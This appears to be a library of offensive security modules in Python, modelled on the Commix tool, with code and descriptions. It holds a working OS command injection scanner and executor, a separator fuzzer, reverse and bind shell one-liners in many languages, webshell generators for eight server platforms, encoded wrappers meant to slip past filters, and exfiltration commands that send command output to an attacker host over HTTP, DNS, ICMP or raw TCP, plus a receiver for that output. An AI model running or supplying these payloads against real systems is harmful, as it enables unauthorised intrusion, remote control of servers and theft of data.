results_based_injection.code:
import urllib.request
import urllib.parse
import re
import string
import random
import time

def test_command_injection(url, param, test_command='id'):
    """Classic results-based OS command injection scanner.
    Tests multiple command separators against a target URL parameter.
    Injects TAG-wrapped echo payloads (commix-style) to detect output reflection.
    Returns dict with 'vulnerable' bool, 'separator', and 'output' if injectable."""
    TAG = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
    SEPARATORS = [
        ';',           # Unix sequential
        '|',           # Pipe (stdout to next cmd)
        '||',          # OR (runs if first fails)
        '&&',          # AND (runs if first succeeds)
        '$(cmd)',      # Command substitution
        '`cmd`',       # Backtick substitution
        '%0a',         # Newline (URL-encoded LF)
        '%0d%0a',      # CRLF injection
    ]
    results = []
    for sep in SEPARATORS:
        if sep == '$(cmd)':
            payload = '$(echo {t1}{c}{t1})'.format(t1=TAG, c='$(' + test_command + ')')
        elif sep == '`cmd`':
            payload = '`echo {t1}``{c}``echo {t1}`'.format(t1=TAG, c=test_command)
        elif sep in ('%0a', '%0d%0a'):
            nl = urllib.parse.unquote(sep)
            payload = nl + 'echo ' + TAG + '$(' + test_command + ')' + TAG
        else:
            payload = sep + ' echo ' + TAG + '$(' + test_command + ')' + TAG
        encoded_payload = urllib.parse.quote(payload, safe='')
        target_url = url.replace('{INJECT}', encoded_payload) if '{INJECT}' in url else url + '?' + urllib.parse.urlencode({param: 'value' + payload})
        req = urllib.request.Request(target_url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        try:
            resp = urllib.request.urlopen(req, timeout=10)
            body = resp.read().decode('utf-8', errors='replace')
        except Exception:
            body = ''
        pattern = re.escape(TAG) + r'(.+?)' + re.escape(TAG)
        match = re.search(pattern, body)
        if match:
            output = match.group(1).strip()
            if output:
                results.append({'vulnerable': True, 'separator': sep, 'output': output, 'tag': TAG})
    if results:
        return results[0]
    return {'vulnerable': False, 'separator': None, 'output': None}

def inject_command(url, param, separator, command):
    """Execute an arbitrary command using a confirmed working separator."""
    TAG = ''.join(random.choice(string.ascii_uppercase) for _ in range(6))
    if separator in (';', '|', '||', '&&'):
        payload = separator + ' echo ' + TAG + '$(' + command + ')' + TAG
    elif separator == '$(cmd)':
        payload = '$(' + command + ')'
    elif separator == '`cmd`':
        payload = '`' + command + '`'
    else:
        nl = urllib.parse.unquote(separator)
        payload = nl + command
    target_url = url + '?' + urllib.parse.urlencode({param: 'x' + payload})
    req = urllib.request.Request(target_url)
    req.add_header('User-Agent', 'Mozilla/5.0')
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        body = resp.read().decode('utf-8', errors='replace')
    except Exception:
        return None
    match = re.search(re.escape(TAG) + r'(.+?)' + re.escape(TAG), body)
    return match.group(1).strip() if match else body
results_based_injection.description: Classic results-based OS command injection scanner inspired by Commix cb_injector. Tests 8 separator types (semicolon, pipe, OR, AND, command substitution, backticks, newline, CRLF) with TAG-wrapped echo payloads to detect reflected command output. Includes confirmed-separator command execution follow-up.

blind_time_injection.description: Time-based blind OS command injection using sleep/ping delay inference. Mirrors Commix tb_injector logic: tests 5 separators with 2 delay commands each, measures response time delta against baseline. Includes character-by-character extraction via ASCII comparison with conditional sleep (Commix-style get_char approach).

file_based_injection.description: Semiblind file-based OS command injection modeled after Commix fb_injector. Injects commands with output redirection (> or >>) to writable paths, then retrieves results via HTTP. Tests 4 separators with 2 write operators. Includes arbitrary command execution and post-exploitation file cleanup.

reverse_shell_payloads.code:
import base64
import re

def generate_reverse_shell(lhost, lport, shell_type='bash'):
    """Generate reverse shell one-liners for 7 languages/methods.
    All payloads connect back to lhost:lport and spawn an interactive shell.
    Returns the payload string ready for injection or execution."""
    lport = str(lport)
    SHELLS = {
        'bash': 'bash -i >& /dev/tcp/{h}/{p} 0>&1',
        'bash_udp': 'bash -i >& /dev/udp/{h}/{p} 0>&1',
        'python': 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{h}",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        'perl': 'perl -e \'use Socket;$i="{h}";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}}\'',
        'php': 'php -r \'$sock=fsockopen("{h}",{p});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        'ruby': 'ruby -rsocket -e\'f=TCPSocket.open("{h}",{p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'nc': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f',
        'nc_e': 'nc -e /bin/sh {h} {p}',
        'powershell': '$client = New-Object System.Net.Sockets.TCPClient("{h}",{p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
        'java': 'Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{h}/{p} 0>&1"}});p.waitFor();',
        'lua': 'os.execute(\'bash -i >& /dev/tcp/{h}/{p} 0>&1\')',
        'socat': 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{h}:{p}',
    }
    template = SHELLS.get(shell_type, SHELLS['bash'])
    return template.format(h=lhost, p=lport)

def generate_reverse_shell_encoded(lhost, lport, shell_type='bash', encoding='base64'):
    """Generate encoded reverse shell for filter bypass.
    Wraps the shell payload in a decode-and-execute wrapper."""
    raw = generate_reverse_shell(lhost, lport, shell_type)
    if encoding == 'base64':
        encoded = base64.b64encode(raw.encode()).decode()
        return 'echo ' + encoded + '|base64 -d|bash'
    elif encoding == 'hex':
        hex_str = raw.encode().hex()
        return 'echo ' + hex_str + '|xxd -r -p|bash'
    return raw

def list_shell_types():
    """Return available reverse shell types."""
    return ['bash', 'bash_udp', 'python', 'perl', 'php', 'ruby', 'nc', 'nc_e', 'powershell', 'java', 'lua', 'socat']
reverse_shell_payloads.description: Reverse shell payload generator for 12 languages/methods: bash /dev/tcp, bash UDP, Python socket+subprocess, Perl IO::Socket, PHP fsockopen, Ruby TCPSocket, netcat (mkfifo and -e variants), PowerShell TCPClient, Java Runtime.exec, Lua os.execute, and socat. Includes base64 and hex encoded wrappers for filter bypass.

bind_shell_payloads.code:
import base64

def generate_bind_shell(port, shell_type='python'):
    """Generate bind shell payloads that listen on a port and serve a shell.
    Attacker connects to target:port after payload execution.
    Returns the bind shell one-liner or script as a string."""
    port = str(port)
    BIND_SHELLS = {
        'python': (
            'python3 -c \'import socket,subprocess,os;'
            's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
            's.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);'
            's.bind(("0.0.0.0",{p}));'
            's.listen(1);'
            'c,a=s.accept();'
            'os.dup2(c.fileno(),0);'
            'os.dup2(c.fileno(),1);'
            'os.dup2(c.fileno(),2);'
            'subprocess.call(["/bin/sh","-i"])\''
        ),
        'perl': (
            'perl -e \'use Socket;'
            'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
            'setsockopt(S,SOL_SOCKET,SO_REUSEADDR,pack("l",1));'
            'bind(S,sockaddr_in({p},INADDR_ANY));'
            'listen(S,1);'
            'accept(C,S);'
            'open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");'
            'exec("/bin/sh -i")\''
        ),
        'nc': 'rm /tmp/bf;mkfifo /tmp/bf;cat /tmp/bf|/bin/sh -i 2>&1|nc -l -p {p} >/tmp/bf',
        'nc_e': 'nc -l -p {p} -e /bin/sh',
        'php': 'php -r \'$s=socket_create(AF_INET,SOCK_STREAM,0);socket_bind($s,"0.0.0.0",{p});socket_listen($s,1);$c=socket_accept($s);while(1){{$cmd=socket_read($c,2048);$out=shell_exec($cmd);socket_write($c,$out,strlen($out));}}\'',
        'ruby': (
            'ruby -rsocket -e\''
            's=TCPServer.new("0.0.0.0",{p});'
            'c=s.accept;'
            'while cmd=c.gets;'
            'IO.popen(cmd,"r"){{|io|c.print io.read}};'
            'end\''
        ),
        'socat': 'socat TCP-LISTEN:{p},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane',
        'powershell': (
            '$listener = New-Object System.Net.Sockets.TcpListener("0.0.0.0",{p});'
            '$listener.Start();'
            '$client = $listener.AcceptTcpClient();'
            '$stream = $client.GetStream();'
            '[byte[]]$bytes = 0..65535|%{{0}};'
            'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{'
            '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
            '$sendback = (iex $data 2>&1 | Out-String);'
            '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);'
            '$stream.Write($sendbyte,0,$sendbyte.Length);'
            '$stream.Flush()}};'
            '$client.Close();$listener.Stop()'
        ),
    }
    template = BIND_SHELLS.get(shell_type, BIND_SHELLS['python'])
    return template.format(p=port)

def generate_bind_shell_encoded(port, shell_type='python', encoding='base64'):
    """Generate encoded bind shell for filter bypass."""
    raw = generate_bind_shell(port, shell_type)
    if encoding == 'base64':
        encoded = base64.b64encode(raw.encode()).decode()
        return 'echo ' + encoded + '|base64 -d|bash'
    elif encoding == 'hex':
        return 'echo ' + raw.encode().hex() + '|xxd -r -p|bash'
    return raw

def list_bind_shell_types():
    """Return available bind shell types."""
    return ['python', 'perl', 'nc', 'nc_e', 'php', 'ruby', 'socat', 'powershell']
bind_shell_payloads.description: Bind shell payload generator for 8 languages/methods: Python socket bind+dup2+exec, Perl Socket bind, netcat (mkfifo and -e variants), PHP socket_create, Ruby TCPServer, socat fork+pty, and PowerShell TcpListener. Includes base64 and hex encoding wrappers for filter bypass.

command_obfuscation.description: Command obfuscation engine implementing 8 WAF/filter bypass techniques derived from Commix tamper scripts: IFS space replacement, hex printf encoding, base64 decode-pipe, reverse string, single-quote concatenation, glob wildcard paths, uninitialized variable insertion, and double-quote splitting. Supports layered multi-technique application.

url_encode_bypass.description: Multi-level URL encoding engine for injection payload filter bypass. Level 1: standard percent-encoding preserving existing sequences. Level 2: double-encoding for WAFs that single-decode. Level 3: IIS Unicode %u00XX format. Level 4: overlong UTF-8 for path traversal (/ -> %C0%AF). Includes selective character encoding and multi-level decoding.

injection_separator_fuzz.code:
import urllib.request
import urllib.parse
import time
import re
import string
import random

def fuzz_separators(url, param, timeout=10):
    """Fuzz all common OS command separators against a target parameter.
    Uses two detection methods: results-based (echo TAG marker reflection)
    and time-based (sleep delay measurement). Modeled after Commix's
    SEPARATORS_LVL1 list covering all Unix and Windows separators.
    Returns list of dicts with working separators and detection method."""
    TAG = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
    SEPS = [
        (';',       'unix_seq',      'results'),
        ('|',       'pipe',          'results'),
        ('||',      'or',            'results'),
        ('&&',      'and',           'results'),
        ('\n',      'newline',       'results'),
        ('\r\n',    'crlf',          'results'),
        ('$(cmd)',   'cmd_sub',       'results'),
        ('`cmd`',    'backtick',      'results'),
        ('%0a',     'url_newline',   'results'),
        ('%0d%0a',  'url_crlf',      'results'),
        ('{cmd,}',  'brace_expand',  'results'),
        ('$({cmd,})','brace_sub',    'results'),
        (';',       'unix_seq_time', 'time'),
        ('|',       'pipe_time',     'time'),
        ('&&',      'and_time',      'time'),
    ]
    working = []
    # Baseline timing
    base_url = url + '?' + urllib.parse.urlencode({param: 'fuzztest'})
    start = time.monotonic()
    try:
        urllib.request.urlopen(urllib.request.Request(base_url, headers={'User-Agent': 'Mozilla/5.0'}), timeout=timeout)
    except Exception:
        pass
    baseline = time.monotonic() - start
    for sep_raw, name, method in SEPS:
        if method == 'results':
            if sep_raw == '$(cmd)':
                payload = '$(echo ' + TAG + ')'
            elif sep_raw == '`cmd`':
                payload = '`echo ' + TAG + '`'
            elif sep_raw in ('{cmd,}', '$({cmd,})'):
                payload = '${IFS}' + TAG if 'sub' in name else sep_raw.replace('cmd', 'echo ' + TAG)
            elif sep_raw.startswith('%'):
                payload = urllib.parse.unquote(sep_raw) + 'echo ' + TAG
            else:
                payload = sep_raw + ' echo ' + TAG
            target = url + '?' + urllib.parse.urlencode({param: 'x' + payload})
            req = urllib.request.Request(target, headers={'User-Agent': 'Mozilla/5.0'})
            try:
                resp = urllib.request.urlopen(req, timeout=timeout)
                body = resp.read().decode('utf-8', errors='replace')
            except Exception:
                body = ''
            if TAG in body:
                working.append({'separator': sep_raw, 'name': name, 'method': 'results', 'confirmed': True})
        elif method == 'time':
            delay = 3
            payload = sep_raw + ' sleep ' + str(delay)
            target = url + '?' + urllib.parse.urlencode({param: 'x' + payload})
            req = urllib.request.Request(target, headers={'User-Agent': 'Mozilla/5.0'})
            start = time.monotonic()
            try:
                urllib.request.urlopen(req, timeout=delay + 10)
            except Exception:
                pass
            elapsed = time.monotonic() - start
            if elapsed - baseline >= delay * 0.7:
                working.append({'separator': sep_raw, 'name': name, 'method': 'time', 'delay': round(elapsed, 2)})
    return working

def fuzz_report(results):
    """Format fuzzing results as a human-readable report."""
    lines = ['=== Command Injection Separator Fuzz Results ===']
    if not results:
        lines.append('No working separators found.')
        return '\n'.join(lines)
    for r in results:
        line = '[+] {name} ({separator}) - {method}'.format(**r)
        if 'delay' in r:
            line += ' delay={delay}s'.format(**r)
        lines.append(line)
    lines.append('\nTotal working separators: %d' % len(results))
    return '\n'.join(lines)
injection_separator_fuzz.description: Comprehensive OS command separator fuzzer testing 15 separator variants against a target. Covers Commix SEPARATORS_LVL1 (semicolon, pipe, OR, AND, newline, CRLF, command substitution, backticks, URL-encoded newline/CRLF, brace expansion) using both results-based TAG reflection and time-based sleep delay detection methods.

webshell_generator.code:
import base64
import re

def generate_webshell(language, method='get', password=None):
    """Generate minimal webshells for common server-side languages.
    Supports PHP, Python/Flask, JSP, ASP/ASP.NET, CGI/Perl, and Node.js.
    Optional password parameter adds authentication check.
    Returns the webshell source code as a string."""
    generators = {
        'php': _php_shell,
        'php_eval': _php_eval_shell,
        'python': _python_shell,
        'jsp': _jsp_shell,
        'asp': _asp_shell,
        'aspx': _aspx_shell,
        'perl': _perl_cgi_shell,
        'node': _node_shell,
    }
    gen = generators.get(language)
    if gen is None:
        raise ValueError('Unknown language: %s. Available: %s' % (language, ', '.join(generators)))
    return gen(method, password)

def _php_shell(method, password):
    param = '$_GET' if method == 'get' else '$_POST'
    auth = "if({p}['k']!=='{pw}')die('404');\n".format(p=param, pw=password) if password else ''
    return '<?php\n{auth}system({p}["c"]);\n?>'.format(auth=auth, p=param)

def _php_eval_shell(method, password):
    param = '$_GET' if method == 'get' else '$_POST'
    auth = "if({p}['k']!=='{pw}')die('404');\n".format(p=param, pw=password) if password else ''
    return '<?php\n{auth}eval({p}["c"]);\n?>'.format(auth=auth, p=param)

def _python_shell(method, password):
    auth_check = ''
    if password:
        auth_check = "    if request.args.get('k') != '{pw}':\n        return '404', 404\n".format(pw=password)
    return (
        'from flask import Flask, request\n'
        'import os\n'
        'app = Flask(__name__)\n'
        '@app.route("/cmd")\n'
        'def cmd():\n'
        '{auth}'
        '    c = request.args.get("c", "")\n'
        '    return os.popen(c).read()\n'
        'if __name__ == "__main__":\n'
        '    app.run(host="0.0.0.0", port=8080)\n'
    ).format(auth=auth_check)

def _jsp_shell(method, password):
    auth = 'if(!request.getParameter("k").equals("{pw}"))return;\n'.format(pw=password) if password else ''
    return (
        '<%@ page import="java.util.*,java.io.*"%>\n'
        '<%\n'
        '{auth}'
        'String cmd = request.getParameter("c");\n'
        'Process p = Runtime.getRuntime().exec(new String[]{{"sh","-c",cmd}});\n'
        'BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
        'String line;\n'
        'while((line=br.readLine())!=null){{out.println(line);}}\n'
        '%>\n'
    ).format(auth=auth)

def _asp_shell(method, password):
    auth = 'If Request("{m}")("k") <> "{pw}" Then Response.End\n'.format(m='QueryString' if method == 'get' else 'Form', pw=password) if password else ''
    return (
        '<%\n'
        '{auth}'
        'Set oShell = CreateObject("WScript.Shell")\n'
        'Set oExec = oShell.Exec("cmd /c " & Request("{m}")("c"))\n'
        'Response.Write oExec.StdOut.ReadAll()\n'
        '%>\n'
    ).format(auth=auth, m='QueryString' if method == 'get' else 'Form')

def _aspx_shell(method, password):
    auth = 'if(Request["{m}"]["k"]!="{pw}")return;\n'.format(m='QueryString' if method == 'get' else 'Form', pw=password) if password else ''
    return (
        '<%@ Page Language="C#"%>\n'
        '<%@ Import Namespace="System.Diagnostics"%>\n'
        '<%\n'
        '{auth}'
        'Process p = new Process();\n'
        'p.StartInfo.FileName = "/bin/sh";\n'
        'p.StartInfo.Arguments = "-c " + Request["c"];\n'
        'p.StartInfo.RedirectStandardOutput = true;\n'
        'p.StartInfo.UseShellExecute = false;\n'
        'p.Start();\n'
        'Response.Write(p.StandardOutput.ReadToEnd());\n'
        '%>\n'
    ).format(auth=auth)

def _perl_cgi_shell(method, password):
    auth = 'exit if param("k") ne "{pw}";\n'.format(pw=password) if password else ''
    return (
        '#!/usr/bin/perl\n'
        'use CGI qw(:standard);\n'
        'print header("text/plain");\n'
        '{auth}'
        'my $cmd = param("c");\n'
        'print `$cmd`;\n'
    ).format(auth=auth)

def _node_shell(method, password):
    auth = '  if(req.query.k!=="{pw}")return res.status(404).end();\n'.format(pw=password) if password else ''
    return (
        'const http=require("http"),{{execSync}}=require("child_process"),url=require("url");\n'
        'http.createServer((req,res)=>{{\n'
        '{auth}'
        '  const q=url.parse(req.url,true).query;\n'
        '  try{{res.end(execSync(q.c).toString())}}\n'
        '  catch(e){{res.end(e.message)}}\n'
        '}}).listen(8080);\n'
    ).format(auth=auth)

def generate_webshell_encoded(language, method='get', password=None, encoding='base64'):
    """Generate encoded webshell for upload evasion."""
    raw = generate_webshell(language, method, password)
    if encoding == 'base64':
        return base64.b64encode(raw.encode()).decode()
    elif encoding == 'hex':
        return raw.encode().hex()
    return raw
webshell_generator.description: Webshell generator for 8 server-side languages: PHP system/eval, Python Flask, JSP Runtime.exec, Classic ASP WScript.Shell, ASP.NET Process, Perl CGI backtick, and Node.js child_process. Supports GET/POST method selection, optional password authentication, and base64/hex encoding for upload filter bypass.

os_command_exfiltration.code:
import base64
import urllib.parse
import re

def exfil_payload(lhost, method='http', command='id', lport=80):
    """Generate OS command output exfiltration payloads via out-of-band channels.
    Useful when command injection is blind (no output reflection, no time inference).
    Supports HTTP, DNS, ICMP, and TCP exfiltration channels.
    Returns a shell command string that exfiltrates command output to lhost."""
    methods = {
        'http': _exfil_http,
        'http_post': _exfil_http_post,
        'dns': _exfil_dns,
        'icmp': _exfil_icmp,
        'tcp': _exfil_tcp,
        'curl_b64': _exfil_curl_b64,
        'wget': _exfil_wget,
        'nslookup': _exfil_nslookup,
    }
    func = methods.get(method)
    if func is None:
        raise ValueError('Unknown method: %s. Available: %s' % (method, ', '.join(methods)))
    return func(lhost, command, lport)

def _exfil_http(lhost, command, lport):
    """HTTP GET exfiltration: curl command output as base64 in URL path."""
    return 'curl http://{h}:{p}/$(echo $({c})|base64|tr -d "\\n")'.format(
        h=lhost, p=lport, c=command)

def _exfil_http_post(lhost, command, lport):
    """HTTP POST exfiltration: send output as POST body."""
    return 'curl -X POST -d "data=$({c})" http://{h}:{p}/exfil'.format(
        h=lhost, p=lport, c=command)

def _exfil_dns(lhost, command, lport):
    """DNS exfiltration: embed output hex in subdomain label.
    Limited to 63 chars per label, 253 total. Best for short outputs."""
    return 'nslookup $({c}|xxd -p|head -c 60).{h}'.format(
        h=lhost, c=command)

def _exfil_icmp(lhost, command, lport):
    """ICMP exfiltration: embed output hex in ping packet pattern field.
    Pattern is limited to 16 hex bytes. Requires root/cap_net_raw."""
    return 'ping -c 1 -p $({c}|xxd -p|head -c 16) {h}'.format(
        h=lhost, c=command)

def _exfil_tcp(lhost, command, lport):
    """Raw TCP exfiltration: send output directly to a listening socket."""
    return '$({c}) > /dev/tcp/{h}/{p}'.format(
        h=lhost, p=lport, c=command)

def _exfil_curl_b64(lhost, command, lport):
    """HTTP exfiltration with full base64 encoding and header injection."""
    return 'curl -H "X-Data: $({c}|base64|tr -d \'\\n\')" http://{h}:{p}/'.format(
        h=lhost, p=lport, c=command)

def _exfil_wget(lhost, command, lport):
    """Wget-based HTTP exfiltration (for systems without curl)."""
    return 'wget -q -O /dev/null "http://{h}:{p}/$({c}|base64|tr -d \'\\n\')"'.format(
        h=lhost, p=lport, c=command)

def _exfil_nslookup(lhost, command, lport):
    """DNS exfiltration via nslookup with chunked output.
    Splits output into 60-char hex chunks, each as a DNS query."""
    return (
        'for chunk in $({c}|xxd -p|fold -w 60); do '
        'nslookup $chunk.{h}; done'
    ).format(h=lhost, c=command)

def generate_receiver_http(bind_addr='0.0.0.0', bind_port=80):
    """Generate a Python HTTP receiver to capture exfiltrated data.
    Returns Python code string that starts an HTTP server logging all requests."""
    return (
        'import http.server\n'
        'import base64\n'
        'import urllib.parse\n'
        'class ExfilHandler(http.server.BaseHTTPRequestHandler):\n'
        '    def do_GET(self):\n'
        '        path = urllib.parse.unquote(self.path.lstrip("/"))\n'
        '        try:\n'
        '            decoded = base64.b64decode(path).decode("utf-8", errors="replace")\n'
        '            print("[EXFIL] " + decoded)\n'
        '        except Exception:\n'
        '            print("[RAW] " + path)\n'
        '        self.send_response(200)\n'
        '        self.end_headers()\n'
        '    def do_POST(self):\n'
        '        length = int(self.headers.get("Content-Length", 0))\n'
        '        body = self.rfile.read(length).decode("utf-8", errors="replace")\n'
        '        print("[POST EXFIL] " + body)\n'
        '        self.send_response(200)\n'
        '        self.end_headers()\n'
        '    def log_message(self, format, *args):\n'
        '        pass\n'
        'httpd = http.server.HTTPServer(("{addr}", {port}), ExfilHandler)\n'
        'print("Listening on {addr}:{port}")\n'
        'httpd.serve_forever()\n'
    ).format(addr=bind_addr, port=bind_port)

def list_exfil_methods():
    """Return available exfiltration methods."""
    return ['http', 'http_post', 'dns', 'icmp', 'tcp', 'curl_b64', 'wget', 'nslookup']
os_command_exfiltration.description: Out-of-band command output exfiltration via 8 channels: HTTP GET (base64 in URL), HTTP POST (body), DNS (hex subdomain labels), ICMP (ping pattern field), raw TCP (/dev/tcp), curl with header injection, wget fallback, and chunked DNS nslookup. Includes a Python HTTP receiver for capturing exfiltrated data.
